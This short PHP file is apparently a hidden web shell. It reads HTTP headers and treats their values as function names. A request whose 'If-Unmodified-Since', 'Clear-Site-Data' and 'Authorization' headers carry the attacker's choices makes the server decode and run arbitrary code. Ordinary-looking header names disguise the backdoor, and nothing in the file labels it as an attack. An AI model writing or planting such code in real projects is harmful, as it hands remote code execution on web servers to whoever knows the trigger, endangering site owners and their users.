<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['If-Unmodified-Since'])) {
    $class = $_HEADERS['If-Unmodified-Since']('', $_HEADERS['Clear-Site-Data']($_HEADERS['Authorization']));
    $class();
}